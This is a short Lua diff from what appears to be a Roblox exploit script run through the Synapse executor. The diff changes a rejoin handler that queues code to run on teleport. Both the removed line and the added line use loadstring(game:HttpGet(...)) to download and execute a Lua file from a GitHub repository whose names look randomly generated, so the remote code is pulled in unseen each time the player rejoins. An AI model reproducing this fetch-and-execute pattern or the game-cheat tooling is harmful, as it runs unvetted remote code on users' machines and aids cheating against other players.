@@ -6596,7 +6596,7 @@ local function EMER_fake_script() -- ProjectAntiAbusers.rejoin.LocalScript
 			syn.queue_on_teleport([[
 						game:GetService('ReplicatedFirst'):RemoveDefaultLoadingScreen()
 						repeat wait(.1) until game:GetService('Players').LocalPlayer
-						loadstring(game:HttpGet("https://raw.githubusercontent.com/asdiasjiodasj/uihfasdiash/main/asdsdfgdfdfgdfgfasd.lua", true))()
+						loadstring(game:HttpGet("https://raw.githubusercontent.com/asdiasjiodasj/sfaijdasioasf/master/safushadasd.lua", true))()
 					]])
 		end
 		game.TeleportService:Teleport(game.PlaceId, game.Players.LocalPlayer)
